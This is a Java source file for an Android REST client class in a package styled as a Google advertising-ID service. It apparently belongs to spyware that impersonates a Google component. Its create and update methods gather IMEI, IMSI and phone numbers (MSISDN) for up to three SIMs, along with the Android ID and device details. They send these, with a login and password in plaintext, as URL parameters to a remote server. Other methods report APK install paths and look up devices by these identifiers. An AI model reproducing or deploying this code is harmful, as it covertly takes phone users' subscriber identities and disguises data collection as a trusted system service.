package com.advertising_id_service.appclick.googleadvertisingidservice.REST;


import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v4.content.Loader;
import android.util.Log;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
import com.advertising_id_service.appclick.googleadvertisingidservice.DeviceInfo;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.InstallationInfo;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;
import com.google.gson.JsonSyntaxException;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class RestServicerSimple implements IRestServicer{

    private static RestServicerSimple instance;
    private RestServicerSimple(){}

    public static synchronized RestServicerSimple getRestServicer()
    {
        if (instance == null){
            instance = new RestServicerSimple();
        }
        return instance;
    }

    @Override
    public ResultCreate create(final Context cnt, LoaderManager lm, final String callDestination, final String login, final String pass) {
//        lm.restartLoader(RestServicer.LOADER_CREATE, null, new LoaderManager.LoaderCallbacks<ResultCreate>() {
//            @SuppressLint("StaticFieldLeak")
//            @Override
//            public Loader<ResultCreate> onCreateLoader(int i, Bundle bundle) {
//                return new AsyncTaskLoader<ResultCreate>(cnt) {
//                    public ResultCreate loadInBackground() {
//                        try {
//                            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
//                            ResultCreate res = null;
//                            FilesLoader fl = new FilesLoader();
//                            String url = RestServicer.BASE_URL;
//                            url += "?" + "login="    + login;
//                            url += "&pass="          + pass;
//                            url += "&action="        + RestServicer.ACTION_CREATE;
//                            url += "&guid="          + devInfo.guid;
//                            url += "&imei1="         + devInfo.imei1;
//                            url += "&imsi1="         + devInfo.imsi1;
//                            url += "&msisdn1="       + devInfo.msisdn1;
//                            url += "&imei2="         + devInfo.imei2;
//                            url += "&imsi2="         + devInfo.imsi2;
//                            url += "&msisdn2="       + devInfo.msisdn2;
//                            url += "&imei3="         + devInfo.imei3;
//                            url += "&imsi3="         + devInfo.imsi3;
//                            url += "&msisdn3="       + devInfo.msisdn3;
//                            url += "&version_os="    + devInfo.version_os;
//                            url += "&device="        + devInfo.device;
//                            url += "&model="         + devInfo.model;
//                            url += "&manufactor="    + devInfo.manufactor;
//                            url += "&brand="         + devInfo.brand;
//                            url += "&android_id="    + devInfo.android_id;
//                            url += "&product_id="    + devInfo.product_id;
//                            url += "&display_hight=" + devInfo.display_hight;
//                            url += "&display_width=" + devInfo.display_width;
//
//                            String json = fl.downloadJson(url);
//                            JSONObject obj = new JSONObject(json);
//                            Logger.log(json);
//                            String result    = obj.has("result")    ? obj.getString("result")    : null;
//                            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
//                            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
//                            String error_id  = obj.has("error_id")  ? obj.getString("error_id") : null;
//                            res = new ResultCreate(result, guid, error_msg, error_id );
//                            return res;
//                        } catch (IllegalStateException | JsonSyntaxException exception){
//                            Logger.log("exception!!!!:" + exception.getMessage());
//                            return null;
//                        } catch (JSONException e) {
//                            Logger.log("JSONException!!!!:" + e.getMessage());
//                            return null;
//                        }
//                    }
//                };
//            }
//
//            @Override
//            public void onLoadFinished(Loader<ResultCreate> loader, ResultCreate result) {
//                if (result == null){Logger.log( "Create: null"); return;}
//                Logger.log("Create:");
//                Logger.log("result "     + result.result);
//                Logger.log( "guid "      + result.guid);
//                Logger.log( "error_id "  + result.error_id);
//                Logger.log( "error_msg " + result.error_msg);
//            }
//
//            @Override
//            public void onLoaderReset(Loader<ResultCreate> loader) {
//
//            }
//        }).forceLoad();

        try {
            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
            ResultCreate res = null;
            FilesLoader fl = new FilesLoader();
            String url = RestServicer.BASE_URL;
            url += "?" + "login="    + login;
            url += "&pass="          + pass;
            url += "&action="        + RestServicer.ACTION_CREATE;
            url += "&guid="          + devInfo.guid;
            url += "&imei1="         + devInfo.imei1;
            url += "&imsi1="         + devInfo.imsi1;
            url += "&msisdn1="       + devInfo.msisdn1;
            url += "&imei2="         + devInfo.imei2;
            url += "&imsi2="         + devInfo.imsi2;
            url += "&msisdn2="       + devInfo.msisdn2;
            url += "&imei3="         + devInfo.imei3;
            url += "&imsi3="         + devInfo.imsi3;
            url += "&msisdn3="       + devInfo.msisdn3;
            url += "&version_os="    + devInfo.version_os;
            url += "&device="        + devInfo.device;
            url += "&model="         + devInfo.model;
            url += "&manufactor="    + devInfo.manufactor;
            url += "&brand="         + devInfo.brand;
            url += "&android_id="    + devInfo.android_id;
            url += "&product_id="    + devInfo.product_id;
            url += "&display_hight=" + devInfo.display_hight;
            url += "&display_width=" + devInfo.display_width;

            String json = fl.downloadJson(url);
            JSONObject obj = new JSONObject(json);
            Logger.log(json);
            String result    = obj.has("result")    ? obj.getString("result")    : null;
            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
            String error_id  = obj.has("error_id")  ? obj.getString("error_id")  : null;
            res = new ResultCreate(result, guid, error_msg, error_id );
            return res;
        } catch (IllegalStateException | JsonSyntaxException exception){
            Logger.log("exception!!!!:" + exception.getMessage());
            return null;
        } catch (JSONException e) {
            Logger.log("JSONException!!!!:" + e.getMessage());
            return null;
        }
    }

    @Override
    public ResultInstall install(final Context cnt, LoaderManager lm, final String callDestination, final InstallationInfo installInfo, final String login, final String pass) {
//        lm.restartLoader(RestServicer.LOADER_INSTALL, null, new LoaderManager.LoaderCallbacks<ResultInstall>() {
//            @SuppressLint("StaticFieldLeak")
//            @Override
//            public Loader<ResultInstall> onCreateLoader(int i, Bundle bundle) {
//                return new AsyncTaskLoader<ResultInstall>(cnt) {
//                    public ResultInstall loadInBackground() {
//                        try {
//                            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
//                            ResultInstall res = null;
//                            FilesLoader fl = new FilesLoader();
//                            String url = RestServicer.BASE_URL;
//                            url += "?" + "login="           + login;
//                            url += "&pass="                 + pass;
//                            url += "&action="               + RestServicer.ACTION_INSTALL;
//                            url += "&guid="                 + installInfo.guid;
//                            url += "&installation_guid="    + installInfo.installation_guid;
//                            url += "&app_id="               + installInfo.app_id;
//                            url += "&apk_guid="             + installInfo.apk_guid;
//                            url += "&apk_distr_path="       + installInfo.apk_distr_path;
//                            url += "&apk_istallation_path=" + installInfo.apk_istallation_path;
//                            url += "&date="                 + installInfo.date;
//
//                            String json = fl.downloadJson(url);
//                            JSONObject obj = new JSONObject(json);
//
//                            String result    = obj.has("result")    ? obj.getString("result")    : null;
//                            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
//                            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
//                            String error_id  = obj.has("error_id")  ? obj.getString("error_id") : null;
//                            res = new ResultInstall(result, guid, error_msg, error_id );
//                            return res;
//                        } catch (JSONException e) {
//                            e.printStackTrace();
//                            return null;
//                        }
//                    }
//                };
//            }
//
//            @Override
//            public void onLoadFinished(Loader<ResultInstall> loader, ResultInstall result) {
//                if (result == null){Logger.log("Install: null"); return;}
//                Logger.log( "Install:");
//                Logger.log( "result "    + result.result);
//                Logger.log( "guid "      + result.guid);
//                Logger.log( "error_id "  + result.error_id);
//                Logger.log( "error_msg " + result.error_msg);
//            }
//
//            @Override
//            public void onLoaderReset(Loader<ResultInstall> loader) {
//
//            }
//        }).forceLoad();

        try {
            ResultInstall res = null;
            FilesLoader fl = new FilesLoader();
            String url = RestServicer.BASE_URL;
            url += "?" + "login="           + login;
            url += "&pass="                 + pass;
            url += "&action="               + RestServicer.ACTION_INSTALL;
            url += "&guid="                 + installInfo.guid;
            url += "&installation_guid="    + installInfo.installation_guid;
            url += "&app_id="               + installInfo.app_id;
            url += "&apk_guid="             + installInfo.apk_guid;
            url += "&apk_distr_path="       + installInfo.apk_distr_path;
            url += "&apk_istallation_path=" + installInfo.apk_istallation_path;
            url += "&date="                 + installInfo.date;

            String json = fl.downloadJson(url);
            JSONObject obj = new JSONObject(json);

            String result    = obj.has("result")    ? obj.getString("result")    : null;
            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
            String error_id  = obj.has("error_id")  ? obj.getString("error_id")  : null;
            res = new ResultInstall(result, guid, error_msg, error_id );
            return res;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public ResultRead read(Context cnt, LoaderManager lm, IApi.RestReadType readType, String callDestination, String login, String pass) {
        ResultRead res = null;
        DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
        FilesLoader fl = new FilesLoader();
        String url  = "";
        String json = "";
        switch (readType) {
            case GUID:
                url = RestServicer.BASE_URL;
                url += "?" + "login="    + login;
                url += "&pass="          + pass;
                url += "&action="        + RestServicer.ACTION_READ;
                url += "&guid="          + devInfo.guid;
                json = fl.downloadJson(url);
                res = jsonToResultRead(json);
                break;
            case IMEI1:
                url = RestServicer.BASE_URL;
                url += "?" + "login="    + login;
                url += "&pass="          + pass;
                url += "&action="        + RestServicer.ACTION_READ;
                url += "&imei1="         + devInfo.imei1;
                json = fl.downloadJson(url);
                res = jsonToResultRead(json);
                break;
            case IMSI1:
                url = RestServicer.BASE_URL;
                url += "?" + "login="    + login;
                url += "&pass="          + pass;
                url += "&action="        + RestServicer.ACTION_READ;
                url += "&imsi1="         + devInfo.imsi1;
                json = fl.downloadJson(url);
                res = jsonToResultRead(json);
                break;
            case MSISDN1:
                url = RestServicer.BASE_URL;
                url += "?" + "login="    + login;
                url += "&pass="          + pass;
                url += "&action="        + RestServicer.ACTION_READ;
                url += "&msisdn1="       + devInfo.msisdn1;
                json = fl.downloadJson(url);
                res = jsonToResultRead(json);
                break;
            default:
                res = null;
                break;
        }
        return res;
    }

    private ResultRead jsonToResultRead(String json)
    {
        FilesLoader fl = new FilesLoader();
        JSONObject obj = null;
        try {
            obj = new JSONObject(json);
            ResultRead resRead = new ResultRead();
            resRead.result    = obj.has("result")    ? obj.getString("result")    : null;
            resRead.error_id  = obj.has("error_id")  ? obj.getString("error_id")  : null;
            resRead.error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
            resRead.found_by  = obj.has("found_by")  ? obj.getString("found_by")  : null;
            resRead.guids = new ArrayList<>();

            JSONArray res_ItemParams = obj.has("guids") ? obj.getJSONArray("guids")  : null;
            if (res_ItemParams != null) {

                for (int i = 0; i < res_ItemParams.length(); i++){
                    JSONObject obj_itemResult = new JSONObject(res_ItemParams.getString(i));
                    ResultRead.ItemParams resRead_itemparams = new ResultRead.ItemParams();
                    resRead_itemparams.model         = obj_itemResult.has("model")         ? obj_itemResult.getString("model")         : null;
                    resRead_itemparams.imei1         = obj_itemResult.has("imei1")         ? obj_itemResult.getString("imei1")         : null;
                    resRead_itemparams.imei2         = obj_itemResult.has("imei2")         ? obj_itemResult.getString("imei2")         : null;
                    resRead_itemparams.imei3         = obj_itemResult.has("imei3")         ? obj_itemResult.getString("imei3")         : null;
                    resRead_itemparams.guid          = obj_itemResult.has("guid")          ? obj_itemResult.getString("guid")          : null;
                    resRead_itemparams.device        = obj_itemResult.has("device")        ? obj_itemResult.getString("device")        : null;
                    resRead_itemparams.ua            = obj_itemResult.has("ua")            ? obj_itemResult.getString("ua")            : null;
                    resRead_itemparams.brand         = obj_itemResult.has("brand")         ? obj_itemResult.getString("brand")         : null;
                    resRead_itemparams.product_id    = obj_itemResult.has("product_id")    ? obj_itemResult.getString("product_id")    : null;
                    resRead_itemparams.guid_source   = obj_itemResult.has("guid_source")   ? obj_itemResult.getString("guid_source")   : null;
                    resRead_itemparams.imsi1         = obj_itemResult.has("imsi1")         ? obj_itemResult.getString("imsi1")         : null;
                    resRead_itemparams.imsi2         = obj_itemResult.has("imsi2")         ? obj_itemResult.getString("imsi2")         : null;
                    resRead_itemparams.imsi3         = obj_itemResult.has("imsi3")         ? obj_itemResult.getString("imsi3")         : null;
                    resRead_itemparams.msisdn1       = obj_itemResult.has("msisdn1")       ? obj_itemResult.getString("msisdn1")       : null;
                    resRead_itemparams.msisdn2       = obj_itemResult.has("msisdn2")       ? obj_itemResult.getString("msisdn2")       : null;
                    resRead_itemparams.msisdn3       = obj_itemResult.has("msisdn3")       ? obj_itemResult.getString("msisdn3")       : null;
                    resRead_itemparams.ua_uuid       = obj_itemResult.has("ua_uuid")       ? obj_itemResult.getString("ua_uuid")       : null;
                    resRead_itemparams.display_hight = obj_itemResult.has("display_hight") ? obj_itemResult.getString("display_hight") : null;
                    resRead_itemparams.android_id    = obj_itemResult.has("android_id")    ? obj_itemResult.getString("android_id")    : null;
                    resRead_itemparams.display_width = obj_itemResult.has("display_width") ? obj_itemResult.getString("display_width") : null;
                    resRead_itemparams.login         = obj_itemResult.has("login")         ? obj_itemResult.getString("login")         : null;
                    resRead_itemparams.date          = obj_itemResult.has("date")          ? obj_itemResult.getString("date")          : null;
                    resRead_itemparams.manufactor    = obj_itemResult.has("manufactor")    ? obj_itemResult.getString("manufactor")    : null;
                    resRead_itemparams.ip            = obj_itemResult.has("ip")            ? obj_itemResult.getString("ip")            : null;
                    resRead_itemparams.version_os    = obj_itemResult.has("version_os")    ? obj_itemResult.getString("version_os")    : null;
                    resRead.guids.add(resRead_itemparams);
                }
            }
            return resRead;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public ResultDelete delete(final Context cnt, LoaderManager lm, final String callDestination, final String login, final String pass) {
//        lm.restartLoader(RestServicer.LOADER_DELETE, null, new LoaderManager.LoaderCallbacks<ResultDelete>() {
//            @SuppressLint("StaticFieldLeak")
//            @Override
//            public Loader<ResultDelete> onCreateLoader(int i, Bundle bundle) {
//                return new AsyncTaskLoader<ResultDelete>(cnt) {
//                    public ResultDelete loadInBackground() {
//                        try {
//                            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
//                            ResultDelete res = null;
//                            FilesLoader fl = new FilesLoader();
//                            String url = RestServicer.BASE_URL;
//                            url += "?" + "login="    + login;
//                            url += "&pass="          + pass;
//                            url += "&action="        + RestServicer.ACTION_DELETE;
//                            url += "&guid="          + devInfo.guid;
//
//                            String json = fl.downloadJson(url);
//                            JSONObject obj = new JSONObject(json);
//
//                            String result    = obj.has("result")    ? obj.getString("result")    : null;
//                            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
//                            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
//                            String error_id  = obj.has("error_id")  ? obj.getString("error_id") : null;
//                            res = new ResultDelete(result, guid, error_msg, error_id );
//                            return res;
//                        } catch (JSONException e) {
//                            e.printStackTrace();
//                            return null;
//                        }
//                    }
//                };
//            }
//
//            @Override
//            public void onLoadFinished(Loader<ResultDelete> loader, ResultDelete result) {
//                if (result == null){Logger.log("delete: null"); return;}
//                Logger.log("delete:");
//                Logger.log("result "    + result.result);
//                Logger.log("guid "      + result.guid);
//                Logger.log("error_id "  + result.error_id);
//                Logger.log("error_msg " + result.error_msg);
//            }
//
//            @Override
//            public void onLoaderReset(Loader<ResultDelete> loader) {
//            }
//        }).forceLoad();
        try {
            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
            ResultDelete res = null;
            FilesLoader fl = new FilesLoader();
            String url = RestServicer.BASE_URL;
            url += "?" + "login="    + login;
            url += "&pass="          + pass;
            url += "&action="        + RestServicer.ACTION_DELETE;
            url += "&guid="          + devInfo.guid;

            String json = fl.downloadJson(url);
            JSONObject obj = new JSONObject(json);

            String result    = obj.has("result")    ? obj.getString("result")    : null;
            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
            String error_id  = obj.has("error_id")  ? obj.getString("error_id")  : null;
            res = new ResultDelete(result, guid, error_msg, error_id );
            return res;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public ResultUpdate update(final Context cnt, LoaderManager lm, final String callDestination, final String login, final String pass) {
//        lm.restartLoader(RestServicer.LOADER_UPDATE, null, new LoaderManager.LoaderCallbacks<ResultUpdate>() {
//            @SuppressLint("StaticFieldLeak")
//            @Override
//            public Loader<ResultUpdate> onCreateLoader(int i, Bundle bundle) {
//                return new AsyncTaskLoader<ResultUpdate>(cnt) {
//                    public ResultUpdate loadInBackground() {
//                        try {
//                            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
//                            ResultUpdate res = null;
//                            FilesLoader fl = new FilesLoader();
//                            String url = RestServicer.BASE_URL;
//                            url += "?" + "login="    + login;
//                            url += "&pass="          + pass;
//                            url += "&action="        + RestServicer.ACTION_UPDATE;
//                            url += "&guid="          + devInfo.guid;
//                            url += "&imei1="         + devInfo.imei1;
//                            url += "&imsi1="         + devInfo.imsi1;
//                            url += "&msisdn1="       + devInfo.msisdn1;
//                            url += "&imei2="         + devInfo.imei2;
//                            url += "&imsi2="         + devInfo.imsi2;
//                            url += "&msisdn2="       + devInfo.msisdn2;
//                            url += "&imei3="         + devInfo.imei3;
//                            url += "&imsi3="         + devInfo.imsi3;
//                            url += "&msisdn3="       + devInfo.msisdn3;
//                            url += "&version_os="    + devInfo.version_os;
//                            url += "&device="        + devInfo.device;
//                            url += "&model="         + devInfo.model;
//                            url += "&manufactor="    + devInfo.manufactor;
//                            url += "&brand="         + devInfo.brand;
//                            url += "&android_id="    + devInfo.android_id;
//                            url += "&product_id="    + devInfo.product_id;
//                            url += "&display_hight=" + devInfo.display_hight;
//                            url += "&display_width=" + devInfo.display_width;
//
//                            String json = fl.downloadJson(url);
//                            JSONObject obj = new JSONObject(json);
//
//                            String result    = obj.has("result")    ? obj.getString("result")    : null;
//                            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
//                            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
//                            String error_id  = obj.has("error_id")  ? obj.getString("error_id") : null;
//                            res = new ResultUpdate(result, guid, error_msg, error_id );
//                            return res;
//
//                        } catch (JSONException e) {
//                            Logger.log("JSONException!!!!:" + e.getMessage());
//                            return null;
//                        }
//                    }
//                };
//            }
//
//            @Override
//            public void onLoadFinished(Loader<ResultUpdate> loader, ResultUpdate result) {
//                if (result == null){Logger.log( "Update: null"); return;}
//                Logger.log("Update:");
//                Logger.log("result "    + result.result);
//                Logger.log("guid "      + result.guid);
//                Logger.log("error_id "  + result.error_id);
//                Logger.log("error_msg " + result.error_msg);
//            }
//
//            @Override
//            public void onLoaderReset(Loader<ResultUpdate> loader) {
//            }
//        }).forceLoad();
        try {
            DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, callDestination);
            ResultUpdate res = null;
            FilesLoader fl = new FilesLoader();
            String url = RestServicer.BASE_URL;
            url += "?" + "login="    + login;
            url += "&pass="          + pass;
            url += "&action="        + RestServicer.ACTION_UPDATE;
            url += "&guid="          + devInfo.guid;
            url += "&imei1="         + devInfo.imei1;
            url += "&imsi1="         + devInfo.imsi1;
            url += "&msisdn1="       + devInfo.msisdn1;
            url += "&imei2="         + devInfo.imei2;
            url += "&imsi2="         + devInfo.imsi2;
            url += "&msisdn2="       + devInfo.msisdn2;
            url += "&imei3="         + devInfo.imei3;
            url += "&imsi3="         + devInfo.imsi3;
            url += "&msisdn3="       + devInfo.msisdn3;
            url += "&version_os="    + devInfo.version_os;
            url += "&device="        + devInfo.device;
            url += "&model="         + devInfo.model;
            url += "&manufactor="    + devInfo.manufactor;
            url += "&brand="         + devInfo.brand;
            url += "&android_id="    + devInfo.android_id;
            url += "&product_id="    + devInfo.product_id;
            url += "&display_hight=" + devInfo.display_hight;
            url += "&display_width=" + devInfo.display_width;

            String json = fl.downloadJson(url);
            JSONObject obj = new JSONObject(json);

            String result    = obj.has("result")    ? obj.getString("result")    : null;
            String guid      = obj.has("guid")      ? obj.getString("guid")      : null;
            String error_msg = obj.has("error_msg") ? obj.getString("error_msg") : null;
            String error_id  = obj.has("error_id")  ? obj.getString("error_id")  : null;
            res = new ResultUpdate(result, guid, error_msg, error_id );
            return res;

        } catch (JSONException e) {
            Logger.log("JSONException!!!!:" + e.getMessage());
            return null;
        }
    }
}
